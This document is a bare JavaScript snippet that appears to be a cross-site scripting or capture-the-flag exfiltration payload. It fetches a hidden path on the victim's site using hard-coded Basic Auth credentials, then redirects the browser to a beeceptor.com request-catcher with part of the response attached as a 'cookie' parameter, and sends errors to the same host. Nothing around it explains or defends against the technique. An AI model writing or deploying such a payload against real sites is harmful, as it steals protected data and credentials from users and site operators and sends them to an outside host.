(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/oldsite/uvdundfngsunpeaeszsdfuipnuqeiweurnvp0etu9qrn0wu9eu0tn0ebu0fruas0dnfp0beqrbeu0afn ', {headers, redirect: 'manual'}).then(res => res.text()).then(res => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + encodeURIComponent(res).slice(5000, 15000));
  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?errcookie=' + JSON.stringify(err))
  });
})()
